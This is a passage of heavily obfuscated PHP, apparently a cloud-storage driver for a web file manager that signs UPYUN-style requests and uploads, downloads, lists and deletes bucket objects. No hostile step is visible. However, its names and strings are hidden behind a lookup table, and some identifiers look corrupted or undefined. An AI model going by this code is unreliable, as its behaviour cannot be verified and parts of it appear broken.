empty($this->userpass) || empty($this->domain)) { throw new Exception($Öß™Œıİ[1467] . LNG($Öß™Œıİ[1398])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($†Íòï¼, $æ…–í¾ = "\107\x45\x54") { $‡²¹€¸å =& $_SERVER[ùÆÎÔ“Ñ]; $óø‘¶‹Ø = gmdate($‡²¹€¸å[1431]); $Ô‚™Ë¾ê = base64_encode(hash_hmac($‡²¹€¸å[1468], "{$æ…–í¾}\46{$†Íòï¼}\46{$óø‘¶‹Ø}", md5("{$this->userpass}"), !0)); $Çèİ»ÛÕ = array("\x41\165\x74\x68\x6f\162\151\172\x61\164\151\157\x6e\72\125\x50\x59\125\116\x20{$this->username}\x3a{$Ô‚™Ë¾ê}", "\x44\141\x74\x65\72{$óø‘¶‹Ø}"); return $Çèİ»ÛÕ; } public function ussRequest($§ìÙíŸ¼, $Ì‘™´ıÊ = "\x47\105\124", $Ø˜áÒ²¿ = false, $¦âÏ”ñ = false, $ğ«âô = false) { $Âã˜Éü =& $_SERVER[ùÆÎÔ“Ñ]; $§ìÙíŸ¼ = trim($§ìÙíŸ¼, $Âã˜Éü[8]); $ŞïåïóÎ = "\x2f{$this->bucket}\57{$§ìÙíŸ¼}"; $§ëşöİø = $this->ussHeaders($ŞïåïóÎ, $Ì‘™´ıÊ); if ($¦âÏ”ñ) { $§ëşöİø = array_merge($§ëşöİø, $¦âÏ”ñ); } $¶‰Õ‹®ë = url_request($this->endpoint . $ŞïåïóÎ, $Ì‘™´ıÊ, $Ø˜áÒ²¿, $§ëşöİø, $ğ«âô); if (!$¶‰Õ‹®ë) { return array($Âã˜Éü[1218] => !1, $Âã˜Éü[1208] => $Âã˜Éü[1469]); } if (strtolower($Ì‘™´ıÊ) == $Âã˜Éü[196] || in_array($¶‰Õ‹®ë[$Âã˜Éü[1218]], array($Âã˜Éü[1324], $Âã˜Éü[1470]))) { $Ø˜áÒ²¿ = $¶‰Õ‹®ë[$Âã˜Éü[1471]]; } else { $Ø˜áÒ²¿ = json_decode($¶‰Õ‹®ë[$Âã˜Éü[1208]], !0); if (!$Ø˜áÒ²¿) { $Ø˜áÒ²¿ = $¶‰Õ‹®ë[$Âã˜Éü[1208]]; } else { if (!$¶‰Õ‹®ë[$Âã˜Éü[751]] && isset($Ø˜áÒ²¿[$Âã˜Éü[1472]])) { $Ø˜áÒ²¿ = $Ø˜áÒ²¿[$Âã˜Éü[1472]]; } } } return array($Âã˜Éü[1218] => $¶‰Õ‹®ë[$Âã˜Éü[751]], $Âã˜Éü[1208] => $Ø˜áÒ²¿); } public function mkfile($††ßçƒ, $Ã¦©ß’û = '', $É«¹÷à¶ = REPEAT_RENAME) { if ($this->setContent($††ßçƒ, $Ã¦©ß’û)) { return $this->getPathOuter($††ßçƒ); } return !1; } public function mkdir($ñûš“ÖŞ, $‡†Âİç“ = REPEAT_SKIP) { $ı¤¶”‰ˆ =& $_SERVER[ùÆÎÔ“Ñ]; $¿ôÅ®Ìè = trim($ñûš“ÖŞ, $ı¤¶”‰ˆ[8]); if ($this->_isFolder($¿ôÅ®Ìè)) { return $this->getPathOuter($¿ôÅ®Ìè); } $ÁÓáÓÏ® = array($ı¤¶”‰ˆ[1473]); $§Š™êàŒ = $this->ussRequest($¿ôÅ®Ìè, $ı¤¶”‰ˆ[226], !1, $ÁÓáÓÏ®); return $§Š™êàŒ[$ı¤¶”‰ˆ[1218]] ? $this->getPathOuter($¿ôÅ®Ìè) : !1; } public function copyFile($Ú›æÉÃÌ, $õÏÔ£á) { $«ŠÀŞº =& $_SERVER[ùÆÎÔ“Ñ]; $ş‚ø¾Ÿ = array($«ŠÀŞº[1474] . "\x2f{$this->bucket}\x2f{$Ú›æÉÃÌ}", $«ŠÀŞº[1475]); $ó»Å Ø = $this->ussRequest($õÏÔ£á, $«ŠÀŞº[228], !1, $ş‚ø¾Ÿ); return $ó»Å Ø[$«ŠÀŞº[1218]] ? !0 : $this->getPathOuter($õÏÔ£á); } public function moveFile($¸‰ê“÷÷, $´ªŒé¿) { $«Ş™øº =& $_SERVER[ùÆÎÔ“Ñ]; $İÙ¦Äà = array($«Ş™øº[1476] . "\x2f{$this->bucket}\57{$¸‰ê“÷÷}", $«Ş™øº[1475]); $‡ş°Èüö = $this->ussRequest($´ªŒé¿, $«Ş™øº[228], !1, $İÙ¦Äà); return $‡ş°Èüö[$«Ş™øº[1218]] ? !0 : $this->getPathOuter($´ªŒé¿); } public function delFile($ëøËéé¿) { $¯å€èÚ =& $_SERVER[ùÆÎÔ“Ñ]; $“ãÉ«…¤ = $this->ussRequest($ëøËéé¿, $¯å€èÚ[1477]); return $“ãÉ«…¤[$¯å€èÚ[1218]] ? !0 : !1; } public function delFolder($Øİ‡š™¹) { $ÛË†µÒÑ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->exist($Øİ‡š™¹)) { return !0; } $this->listItemCache = !1; $ªşù¨é² = $Ç‹ôâÓ = array(); $this->fileList($Øİ‡š™¹, $ªşù¨é², $Ç‹ôâÓ, !0); $this->listItemCache = !0; foreach ($Ç‹ôâÓ as $“Â™×âÈ) { $×±œ“†€ = $this->ussRequest($“Â™×âÈ[$ÛË†µÒÑ[32]], $ÛË†µÒÑ[1477]); if (!$×±œ“†€[$ÛË†µÒÑ[1218]]) { return !1; } } foreach ($ªşù¨é² as $øõ©æ§·) { $×±œ“†€ = $this->ussRequest($øõ©æ§·, $ÛË†µÒÑ[1477]); if (!$×±œ“†€[$ÛË†µÒÑ[1218]]) { return !1; } } $×±œ“†€ = $this->ussRequest($Øİ‡š™¹, $ÛË†µÒÑ[1477]); return $×±œ“†€[$ÛË†µÒÑ[1218]]; } public function rename($€úı¡, $ìËôàÊò) { if ($this->isFile($€úı¡)) { $ìËôàÊò = get_path_father($€úı¡) . $ìËôàÊò; return $this->moveFile($€úı¡, $ìËôàÊò); } return $this->renameObject($€úı¡, $ìËôàÊò); } public function fileInfo($¬¶¶ô€ª, $®ãò¥„í = false, $õŒÔÃ€ = array()) { $ê»ƒÌâ½ =& $_SERVER[ùÆÎÔ“Ñ]; $Ÿ‚ä”§Û = array($ê»ƒÌâ½[32] => $this->pathThis($¬¶¶ô€ª), $ê»ƒÌâ½[84] => $this->getPathOuter($ê»ƒÌâ½[8] . $¬¶¶ô€ª), $ê»ƒÌâ½[33] => $ê»ƒÌâ½[199], $ê»ƒÌâ½[76] => isset($õŒÔÃ€[$ê»ƒÌâ½[76]]) ? $õŒÔÃ€[$ê»ƒÌâ½[76]] : 0, $ê»ƒÌâ½[174] => $this->ext($¬¶¶ô€ª)); if ($®ãò¥„í) { return $Ÿ‚ä”§Û; } $Ÿ‚ä”§Û[$ê»ƒÌâ½[200]] = $Ÿ‚ä”§Û[$ê»ƒÌâ½[85]] = 0; $Ÿ‚ä”§Û[$ê»ƒÌâ½[201]] = $Ÿ‚ä”§Û[$ê»ƒÌâ½[202]] = !0; if (empty($õŒÔÃ€)) { $õŒÔÃ€ = $this->objectMeta($¬¶¶ô€ª); if (!$õŒÔÃ€) { return $Ÿ‚ä”§Û; } } $Ÿ‚ä”§Û[$ê»ƒÌâ½[200]] = intval($õŒÔÃ€[$ê»ƒÌâ½[1478]]); $Ÿ‚ä”§Û[$ê»ƒÌâ½[85]] = intval($õŒÔÃ€[$ê»ƒÌâ½[1479]]); $Ÿ‚ä”§Û[$ê»ƒÌâ½[76]] = $õŒÔÃ€[$ê»ƒÌâ½[76]]; return $Ÿ‚ä”§Û; } public function folderInfo($¼çÂ™˜, $¦ÊôËÔ¥ = false) { $í‡†ãÈ´ =& $_SERVER[ùÆÎÔ“Ñ]; $…é¸¼œä = array($í‡†ãÈ´[32] => $this->pathThis($¼çÂ™˜), $í‡†ãÈ´[84] => $this->getPathOuter($í‡†ãÈ´[8] . $¼çÂ™˜), $í‡†ãÈ´[33] => $í‡†ãÈ´[75]); if ($¦ÊôËÔ¥) { return $…é¸¼œä; } $…é¸¼œä[$í‡†ãÈ´[200]] = $…é¸¼œä[$í‡†ãÈ´[85]] = 0; $…é¸¼œä[$í‡†ãÈ´[201]] = $…é¸¼œä[$í‡†ãÈ´[202]] = !0; if (empty($éæ³Œ”„)) { $éæ³Œ”„ = $this->objectMeta($¼çÂ™˜); if (!$éæ³Œ”„) { return $…é¸¼œä; } } $…é¸¼œä[$í‡†ãÈ´[200]] = intval($éæ³Œ”„[$í‡†ãÈ´[1478]]); $…é¸¼œä[$í‡†ãÈ´[85]] = intval($éæ³Œ”„[$í‡†ãÈ´[1479]]); return $…é¸¼œä; } private function listObjs($»‰…áùÓ, $Ô’ÏƒÅ¥ = 0, $«Ôò”‰Æ = 1000) { $¦Çø¶²Û =& $_SERVER[ùÆÎÔ“Ñ]; $™õÚş¿— = array($¦Çø¶²Û[1480], $¦Çø¶²Û[1481] . $«Ôò”‰Æ); if ($Ô’ÏƒÅ¥) { $™õÚş¿—[] = $¦Çø¶²Û[1482] . $Ô’ÏƒÅ¥; } $ãõÙ‚ = $this->ussRequest($»‰…áùÓ, $¦Çø¶²Û[230], !1, $™õÚş¿—); return !$ãõÙ‚[$¦Çø¶²Û[1218]] ? !1 : $ãõÙ‚[$¦Çø¶²Û[1208]]; } private function fileList($¢Ó“âêÉ, &$ÙåÓ¿ó‚, &$¾È¼ş›‰, $Ìœ¼”Ç = false) { $Æ€Š¥’É =& $_SERVER[ùÆÎÔ“Ñ]; $£ïœ„•ë = $Æ€Š¥’É[12]; $ö­Òì–é = 1000; $şìÖıÅÙ = rtrim($¢Ó“âêÉ, $Æ€Š¥’É[8]) . $Æ€Š¥’É[8]; while (!0) { check_abort(); $Ä¡®İ˜û = $this->listObjs($¢Ó“âêÉ, $£ïœ„•ë, $ö­Òì–é); if (!$Ä¡®İ˜û) { return !1; } $£ïœ„•ë = isset($Ä¡®İ˜û[$Æ€Š¥’É[1483]]) ? $Ä¡®İ˜û[$Æ€Š¥’É[1483]] : $Æ€Š¥’É[12]; $—ùÕ®” = isset($Ä¡®İ˜û[$Æ€Š¥’É[1484]]) ? $Ä¡®İ˜û[$Æ€Š¥’É[1484]] : array(); foreach ($—ùÕ®” as $´¶ºîÔî) { $‹ŒêŞŸ = $´¶ºîÔî[$Æ€Š¥’É[33]] == $Æ€Š¥’É[75] ? !0 : !1; $ö¿Éä» = ltrim($şìÖıÅÙ . $´¶ºîÔî[$Æ€Š¥’É[32]], $Æ€Š¥’É[8]) . ($‹ŒêŞŸ ? $Æ€Š¥’É[8] : $Æ€Š¥’É[12]); $¶ìËÙ¼ù = array($Æ€Š¥’É[32] => $ö¿Éä», $Æ€Š¥’É[33] => $‹ŒêŞŸ ? $Æ€Š¥’É[75] : $Æ€Š¥’É[199], $Æ€Š¥’É[76] => $´¶ºîÔî[$Æ€Š¥’É[337]], $Æ€Š¥’É[1479] => $´¶ºîÔî[$Æ€Š¥’É[1485]]); $this->cacheMethodInfoSet($ö¿Éä», $‹ŒêŞŸ, $¶ìËÙ¼ù); if ($‹ŒêŞŸ) { $ÙåÓ¿ó‚[] = $ö¿Éä»; if ($Ìœ¼”Ç) { $this->fileList($ö¿Éä», $ÙåÓ¿ó‚, $¾È¼ş›‰, $Ìœ¼”Ç); } continue; } $¾È¼ş›‰[] = $¶ìËÙ¼ù; } if (count($—ùÕ®”) < $ö­Òì–é) { break; } } $this->cacheMethodInfoSet($¢Ó“âêÉ, !0); } public function listPath($¥¢µØ–ã, $£²ªî™ = false) { $³‹êå²÷ =& $_SERVER[ùÆÎÔ“Ñ]; $Ò’öµ¦» = $¤’–¼È£ = array(); $this->fileList($¥¢µØ–ã, $Ò’öµ¦», $¤’–¼È£); foreach ($Ò’öµ¦» as $ÂÃúÃ¼é => $îÊ¸Óïâ) { $Ò’öµ¦»[$ÂÃúÃ¼é] = $this->folderInfo($îÊ¸Óïâ, $£²ªî™); } foreach ($¤’–¼È£ as $ÂÃúÃ¼é => $îÊ¸Óïâ) { $¤’–¼È£[$ÂÃúÃ¼é] = $this->fileInfo($îÊ¸Óïâ[$³‹êå²÷[32]], $£²ªî™, $îÊ¸Óïâ); } return array($³‹êå²÷[82] => $Ò’öµ¦», $³‹êå²÷[83] => $¤’–¼È£); } public function has($çäÛÂäà, $•ÏÀ¯ÆË = false, $›ÔÓ‚Ù = true) { $Ú²Š¿Ï¼ =& $_SERVER[ùÆÎÔ“Ñ]; $òëèß×‹ = $Ú²Š¿Ï¼[12]; $¾·›•š± = 500; $–·¨ÌØ = 0; $³¾„«êà = 0; $Â¾åâÉ‹ = rtrim($çäÛÂäà, $Ú²Š¿Ï¼[8]) . $Ú²Š¿Ï¼[8]; while (!0) { check_abort(); $ŒÓ¦“õ¡ = $this->listObjs($çäÛÂäà, $òëèß×‹, $¾·›•š±); if (!$ŒÓ¦“õ¡) { return !1; } $òëèß×‹ = isset($ŒÓ¦“õ¡[$Ú²Š¿Ï¼[1483]]) ? $ŒÓ¦“õ¡[$Ú²Š¿Ï¼[1483]] : $Ú²Š¿Ï¼[12]; $Öâ¿‚Ó = isset($ŒÓ¦“õ¡[$Ú²Š¿Ï¼[1484]]) ? $ŒÓ¦“õ¡[$Ú²Š¿Ï¼[1484]] : array(); if (empty($Öâ¿‚Ó)) { break; } $ë…‘Ù›Ò = array_filter($Öâ¿‚Ó, function ($ÇØ¡›®¤) { $åúî¬ğª =& $_SERVER[ùÆÎÔ“Ñ]; return $ÇØ¡›®¤[$åúî¬ğª[33]] == $åúî¬ğª[75]; }); $×ôÍ½âÀ = count($Öâ¿‚Ó); $ë…‘Ù›Ò = count($ë…‘Ù›Ò); $•Ëªş¹Ö = $×ôÍ½âÀ - $ë…‘Ù›Ò; if ($•ÏÀ¯ÆË) { $³¾„«êà += $ë…‘Ù›Ò; $–·¨ÌØ += $•Ëªş¹Ö; if ($×ôÍ½âÀ < $¾·›•š±) { break; } continue; } if ($›ÔÓ‚Ù) { if ($•Ëªş¹Ö) { return !0; } } else { if ($ë…‘Ù›Ò) { return !0; } } if ($×ôÍ½âÀ < $¾·›•š±) { break; } } if ($•ÏÀ¯ÆË) { return array($Ú²Š¿Ï¼[207] => $–·¨ÌØ, $Ú²Š¿Ï¼[208] => $³¾„«êà); } return !1; } public function listAll($èºè€˜ø) { $™ºá¢üú =& $_SERVER[ùÆÎÔ“Ñ]; $ºåğÜòß = $œÀûèÇÙ = array(); $this->fileList($èºè€˜ø, $ºåğÜòß, $œÀûèÇÙ, !0); $‘Ã…›†ñ = array(); foreach ($œÀûèÇÙ as $–·ÁÓ©) { $‘Ã…›†ñ[$–·ÁÓ©[$™ºá¢üú[32]]] = $–·ÁÓ©[$™ºá¢üú[76]]; } foreach ($ºåğÜòß as $–·ÁÓ©) { if (is_string($–·ÁÓ©)) { $‘Ã…›†ñ[$–·ÁÓ©] = 0; } } return $this->listAllFiles($èºè€˜ø, array_keys($‘Ã…›†ñ), $‘Ã…›†ñ); } public function canRead($Å‹ âß…) { return $this->exist($Å‹ âß…) ? !0 : !1; } public function canWrite($ŠÍ½¸·æ) { return $this->exist($ŠÍ½¸·æ) ? !0 : !1; } public function getContent($¼«ÍøµÊ) { return $this->fileSubstr($¼«ÍøµÊ, 0, -1); } public function setContent($°­Œê‰, $ìŞ´‡Äş = '') { $Â½¸˜ÊÆ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ìŞ´‡Äş) { $Î¯«–šÃ = $this->ussRequest($°­Œê‰, $Â½¸˜ÊÆ[226]); return $Î¯«–šÃ[$Â½¸˜ÊÆ[1218]]; } $‹ñ‹•Â¶ = $this->tempFile($this->pathThis($°­Œê‰)); file_put_contents($‹ñ‹•Â¶, $ìŞ´‡Äş); if ($this->upload($°­Œê‰, $‹ñ‹•Â¶)) { $this->tempFileRemve($‹ñ‹•Â¶); return !0; } return !1; } public function fileSubstr($·èÕâˆ‰, $Ú¶ĞüÆÃ, $ã¨¡¹²Ø) { $İÓ‚ÑÀÓ =& $_SERVER[ùÆÎÔ“Ñ]; if (!($ˆÄÀ©êü = $this->link($·èÕâˆ‰))) { return !1; } $Ù¹Ïä¹– = !1; if ($ã¨¡¹²Ø > 0) { $ˆ½ùùÀò = $Ú¶ĞüÆÃ + $ã¨¡¹²Ø - 1; $Ù¹Ïä¹– = array($İÓ‚ÑÀÓ[1446] . $Ú¶ĞüÆÃ . $İÓ‚ÑÀÓ[386] . $ˆ½ùùÀò); } $ŸÇÍåš = url_request($ˆÄÀ©êü, $İÓ‚ÑÀÓ[230], !1, $Ù¹Ïä¹–); return $ŸÇÍåš[$İÓ‚ÑÀÓ[751]] ? $ŸÇÍåš[$İÓ‚ÑÀÓ[1208]] : !1; } public function upload($‡™ı·¿ò, $®²Ö‡Ì, $Ö¥–¾šÈ = false, $†®Ç = REPEAT_REPLACE) { $ö¼ “¥ =& $_SERVER[ùÆÎÔ“Ñ]; $ŞÓÏ¹õ = IO::size($®²Ö‡Ì); if ($ŞÓÏ¹õ <= 1024 * 1024 * 200) { $ÆÆıîİñ = array($ö¼ “¥[1486] . $®²Ö‡Ì); $ã©£ïÔ¼ = $this->ussRequest($‡™ı·¿ò, $ö¼ “¥[228], $ÆÆıîİñ); return $ã©£ïÔ¼[$ö¼ “¥[1218]] ? $this->getPathOuter($‡™ı·¿ò) : !1; } $…êÃŸ¦Í = 1024 * 1024 * 10; $‡¬êóà = array($ö¼ “¥[1487], $ö¼ “¥[1488] . $ŞÓÏ¹õ, $ö¼ “¥[1489], $ö¼ “¥[1490] . $…êÃŸ¦Í); $ã©£ïÔ¼ = $this->ussRequest($‡™ı·¿ò, $ö¼ “¥[228], !1, $‡¬êóà); if (!$ã©£ïÔ¼[$ö¼ “¥[1218]]) { return !1; } $¨´ò ¸ó = $ã©£ïÔ¼[$ö¼ “¥[1208]]; $õ’õŸ‹ = 0; $«¿Çñ — = $¨´ò ¸ó[$ö¼ “¥[1491]]; $šÆç£ã = fopen($®²Ö‡Ì, $ö¼ “¥[1395]); if (!$šÆç£ã) { return !1; } do { $ß¥Š×Ñ = $¨´ò ¸ó[$ö¼ “¥[1492]]; fseek_64($šÆç£ã, $õ’õŸ‹); $‘öšŞÃ– = fread($šÆç£ã, $ß¥Š×Ñ); $“ö—ÂÓ± = 0; do { $“ö—ÂÓ±++; $¨´ò ¸ó = $this->uploadPart($‡™ı·¿ò, $¨´ò ¸ó, $‘öšŞÃ–); } while (!$¨´ò ¸ó && $“ö—ÂÓ± < 3); if (!$¨´ò ¸ó) { return !1; } $«¿Çñ — = $¨´ò ¸ó[$ö¼ “¥[1491]]; $õ’õŸ‹ += $ß¥Š×Ñ; } while ($«¿Çñ — != -1); fclose($šÆç£ã); $‡¬êóà = array($ö¼ “¥[1493], $ö¼ “¥[1494] . $¨´ò ¸ó[$ö¼ “¥[1495]], $ö¼ “¥[1489]); $ã©£ïÔ¼ = $this->ussRequest($‡™ı·¿ò, $ö¼ “¥[228], !1, $‡¬êóà); return $ã©£ïÔ¼[$ö¼ “¥[1218]] ? $this->getPathOuter($ÀÃŒÆÎÏ) : !1; } private function uploadPart($‘ÈÉ£¸Å, $äîÓ›²Ú, &$„ú²ª•±) { $¯½ÊÃõà =& $_SERVER[ùÆÎÔ“Ñ]; $Ë×±ˆ¤ô = array($¯½ÊÃõà[1496], $¯½ÊÃõà[1494] . $äîÓ›²Ú[$¯½ÊÃõà[1495]], $¯½ÊÃõà[1497] . $äîÓ›²Ú[$¯½ÊÃõà[1491]], $¯½ÊÃõà[142] . $äîÓ›²Ú[$¯½ÊÃõà[1492]]); $¸‡ÌÆø = $this->ussRequest($‘ÈÉ£¸Å, $¯½ÊÃõà[228], $„ú²ª•±, $Ë×±ˆ¤ô); return !$¸‡ÌÆø[$¯½ÊÃõà[1218]] ? $¸‡ÌÆø[$¯½ÊÃõà[1218]] : $¸‡ÌÆø[$¯½ÊÃõà[1208]]; } public function uploadFormData($ËÙ‚€¨¡, $‰ÅŸ¿’ë = 3600) { return $this->uploadPolicy($ËÙ‚€¨¡, $‰ÅŸ¿’ë); } public function multiUploadFormData($ª– ¯“, $ÓìíÜ‹ù = 3600) { $Ä‡ş„Øé =& $_SERVER[ùÆÎÔ“Ñ]; $•›¡±“å = (int) $GLOBALS[$Ä‡ş„Øé[7]][$Ä‡ş„Øé[76]]; return $this->uploadPolicy($ª– ¯“, $ÓìíÜ‹ù, $•›¡±“å); } private function uploadPolicy($–°Ï¯ÌÍ, $ñ¤£òùƒ = 3600, $­£Ë›Æ¢ = 0) { $Â¾åŸŸÌ =& $_SERVER[ùÆÎÔ“Ñ]; $ğ‡Çƒ¦ = $Â¾åŸŸÌ[8] . $this->bucket; $› ®Ù à = gmdate($Â¾åŸŸÌ[1431]); $Ì×íË©â = array($Â¾åŸŸÌ[1498] => $this->bucket, $Â¾åŸŸÌ[1499] => $–°Ï¯ÌÍ, $Â¾åŸŸÌ[1500] => time() + $ñ¤£òùƒ, $Â¾åŸŸÌ[1501] => $› ®Ù à); if ($­£Ë›Æ¢) { $Ì×íË©â[$Â¾åŸŸÌ[1411]] = $­£Ë›Æ¢; } $ÛÜ÷¨àº = base64_encode(json_encode($Ì×íË©â)); $¾ÄÉÃÖÈ = base64_encode(hash_hmac($Â¾åŸŸÌ[1468], "\x50\x4f\123\124\46{$ğ‡Çƒ¦}\x26{$› ®Ù à}\x26{$ÛÜ÷¨àº}", md5("{$this->userpass}"), !0)); $ùïã¦ğµ = array($Â¾åŸŸÌ[1336] => $ÛÜ÷¨àº, $Â¾åŸŸÌ[1502] => "\x55\x50\x59\x55\x4e\x20{$this->username}\72{$¾ÄÉÃÖÈ}", $Â¾åŸŸÌ[181] => $this->endpoint . $ğ‡Çƒ¦); return $ùïã¦ğµ; } public function download($“Š‹áÈ , $âûÒ »ø) { $ãÈÔŸõ = IO::getPathInner(IO::mkfile($âûÒ »ø)); if (!($·÷ñ˜ à = $this->link($“Š‹áÈ ))) { return !1; } $—­±Ö»ù = 0; $¹™¹Ú¶ = 1024 * 200; $ùî‹¾ä = fopen($ãÈÔŸõ, $_SERVER[ùÆÎÔ“Ñ][1452]); while (!0) { $™À¤„Óê = $this->fileSubstr($“Š‹áÈ , $—­±Ö»ù, $¹™¹Ú¶); if ($™À¤„Óê === !1) { return !1; } fwrite($ùî‹¾ä, $™À¤„Óê); $—­±Ö»ù += $¹™¹Ú¶; if (strlen($™À¤„Óê) < $¹™¹Ú¶) { break; } } fclose($ùî‹¾ä); return $âûÒ »ø; } public function link($ì¥¶°®ù, $ñÔû®î  = array()) { $·çƒâñÓ =& $_SERVER[ùÆÎÔ“Ñ]; $ì¥¶°®ù = trim($ì¥¶°®ù, $·çƒâñÓ[8]); if (!empty($this->token)) { $ª˜ò•Îº = strtotime(date($·çƒâñÓ[1503])); $Í”‰İÌ = substr(md5($this->token . $·çƒâñÓ[284] . $ª˜ò•Îº . $·çƒâñÓ[1504] . $ì¥¶°®ù), 12, 8) . $ª˜ò•Îº; $ñÔû®î [] = $·çƒâñÓ[1505] . $Í”‰İÌ; } $øâ«˜Ïõ = !empty($ñÔû®î ) ? $·çƒâñÓ[73] . implode($·çƒâñÓ[284], $ñÔû®î ) : $·çƒâñÓ[12]; return $this->getHost() . $·çƒâñÓ[8] . $ì¥¶°®ù . $øâ«˜Ïõ; } public function fileOut($ôô—¹¾, $êÄùğĞê = false, $ÖØ„»÷´ = false, $¤ßñÕáº = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ôô—¹¾, $êÄùğĞê, $ÖØ„»÷´, $¤ßñÕáº); } if (!$ÖØ„»÷´) { $ÖØ„»÷´ = $this->pathThis($ôô—¹¾); } $ô‘Ç×Ê„ = $êÄùğĞê ? array($_SERVER[ùÆÎÔ“Ñ][1506] . rawurlencode($ÖØ„»÷´)) : array(); $ÕôÀòàé = $this->link($ôô—¹¾, $ô‘Ç×Ê„); $this->fileOutLink($ÕôÀòàé); } public function fileOutServer($ĞİšÖı, $äÃÈö ø = false, $´ê¹Û™– = false, $Š¤şà… = '') { parent::fileOut($ĞİšÖı, $äÃÈö ø, $´ê¹Û™–, $Š¤şà…); } public function fileOutImage($‰Å¾åáê, $ÜşŒ†¬œ = 250) { $›¥õ« = $this->link($‰Å¾åáê . $_SERVER[ùÆÎÔ“Ñ][1507] . $ÜşŒ†¬œ); $this->fileOutLink($›¥õ«); } public function fileOutImageServer($µ„®¥÷Î, $ù©æ×° = 250) { parent::fileOutImage($µ„®¥÷Î, $ù©æ×°); } public function hashMd5($Û³ÍÕ¤Ş) { $Â­Â‹Áš =& $_SERVER[ùÆÎÔ“Ñ]; $ëä¯“œ = $this->_objectMeta($Û³ÍÕ¤Ş); return isset($ëä¯“œ[$Â­Â‹Áš[212]]) ? $ëä¯“œ[$Â­Â‹Áš[212]] : !1; } public function size($Õ¸ê»¹) { $Çßî»Åå = $this->objectMeta($Õ¸ê»¹); return $Çßî»Åå ? $Çßî»Åå[$_SERVER[ùÆÎÔ“Ñ][76]] : 0; } public function info($÷şê´Â) { if ($this->isFolder($÷şê´Â)) { return $this->folderInfo($÷şê´Â); } else { if ($this->isFile($÷şê´Â)) { return $this->fileInfo($÷şê´Â); } } return !1; } public function exist($²éË…Ä) { return $this->isFile($²éË…Ä) || $this->isFolder($²éË…Ä); } public function isFile($”¾­éù) { return !$this->isFolder($”¾­éù) && $this->objectMeta($”¾­éù); } public function isFolder($ƒ”²é£) { return $this->cacheMethod($_SERVER[ùÆÎÔ“Ñ][165], $ƒ”²é£); } protected function objectMeta($çâÄ) { return $this->cacheMethod($_SERVER[ùÆÎÔ“Ñ][167], $çâÄ); } protected function _objectMeta($Œ¯ü§»¢) { $»ã¸‘æ² =& $_SERVER[ùÆÎÔ“Ñ]; if ($Œ¯ü§»¢ == $»ã¸‘æ²[12] || $Œ¯ü§»¢ == $»ã¸‘æ²[8]) { return array(); } $Ş¦‹—ˆî = $this->ussRequest($Œ¯ü§»¢, $»ã¸‘æ²[1508]); if (!$Ş¦‹—ˆî[$»ã¸‘æ²[1218]]) { return null; } $áìƒÅ¬ó = isset($Ş¦‹—ˆî[$»ã¸‘æ²[1208]]) ? $Ş¦‹—ˆî[$»ã¸‘æ²[1208]] : array(); if (!isset($áìƒÅ¬ó[$»ã¸‘æ²[1509]])) { return null; } $á£¤¤¨˜ = array($»ã¸‘æ²[33] => isset($áìƒÅ¬ó[$»ã¸‘æ²[1509]]) ? $áìƒÅ¬ó[$»ã¸‘æ²[1509]] : null, $»ã¸‘æ²[76] => isset($áìƒÅ¬ó[$»ã¸‘æ²[1510]]) ? $áìƒÅ¬ó[$»ã¸‘æ²[1510]] : null, $»ã¸‘æ²[212] => isset($áìƒÅ¬ó[$»ã¸‘æ²[1511]]) ? $áìƒÅ¬ó[$»ã¸‘æ²[1511]] : null, $»ã¸‘æ²[1478] => isset($áìƒÅ¬ó[$»ã¸‘æ²[1512]]) ? $áìƒÅ¬ó[$»ã¸‘æ²[1512]] : null); $á£¤¤¨˜[$»ã¸‘æ²[1479]] = isset($áìƒÅ¬ó[$»ã¸‘æ²[1513]]) ? strtotime($áìƒÅ¬ó[$»ã¸‘æ²[1513]]) : $á£¤¤¨˜[$»ã¸‘æ²[1478]]; return $á£¤¤¨˜; } protected function _isFolder($û¥Õ«šœ) { $Ü€ÏŒ¨œ =& $_SERVER[ùÆÎÔ“Ñ]; if ($û¥Õ«šœ == $Ü€ÏŒ¨œ[12] || $û¥Õ«šœ == $Ü€ÏŒ¨œ[8]) { return !0; } $¶Ü·‰°ë = $this->_objectMeta($û¥Õ«šœ); return isset($¶Ü·‰°ë[$Ü€ÏŒ¨œ[33]]) && $¶Ü·‰°ë[$Ü€ÏŒ¨œ[33]] == $Ü€ÏŒ¨œ[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ë†Ó–š = false) { } public function exist($ìãíšè) { $«¼ÏÅµ = $this->info($ìãíšè); return $«¼ÏÅµ[$_SERVER[ùÆÎÔ“Ñ][201]]; } public function isFile($ûÁ‹ãŒê) { $¥å’ˆ÷ = $this->info($ûÁ‹ãŒê); return $¥å’ˆ÷[$_SERVER[ùÆÎÔ“Ñ][201]]; } public function isFolder($¼É×¥Î÷) { return !1; } public function size($ÔÈãßñ) { $—»¿•à“ = $this->info($ÔÈãßñ); return $—»¿•à“[$_SERVER[ùÆÎÔ“Ñ][76]]; } public function info($äğÚ—¼) { return $this->infoParse($äğÚ—¼); } public function infoAuth($ßšğşÌÙ) { return $this->infoParse($ßšğşÌÙ); } public function infoWithChildren($ıèÛğº) { return $this->infoParse($ıèÛğº); } public function infoFull($œÍûË°) { return $this->infoParse($œÍûË°); } private function infoParse($İŸ¿ªîº) { $ê¥Ãâî¼ =& $_SERVER[ùÆÎÔ“Ñ]; $èÃÂûó« = $this->header($İŸ¿ªîº); if (!$èÃÂûó« || !$èÃÂûó«[$ê¥Ãâî¼[751]]) { return !1; } $±¹Äô  = _get($èÃÂûó«, $ê¥Ãâî¼[337], 0); $ÑÔÛ”»Ò = array($ê¥Ãâî¼[32] => $èÃÂûó«[$ê¥Ãâî¼[32]], $ê¥Ãâî¼[84] => $İŸ¿ªîº, $ê¥Ãâî¼[33] => $ê¥Ãâî¼[199], $ê¥Ãâî¼[76] => intval($±¹Äô ), $ê¥Ãâî¼[174] => get_path_ext($èÃÂûó«[$ê¥Ãâî¼[32]]), $ê¥Ãâî¼[1392] => $±¹Äô  > 0 && $èÃÂûó«[$ê¥Ãâî¼[1514]], $ê¥Ãâî¼[1393] => !1); return $ÑÔÛ”»Ò; } private function header($¢ë“›Ë) { $³Î¨ÙÏ‡ =& $_SERVER[ùÆÎÔ“Ñ]; if (isset(self::$_cacheHeader[$¢ë“›Ë])) { return 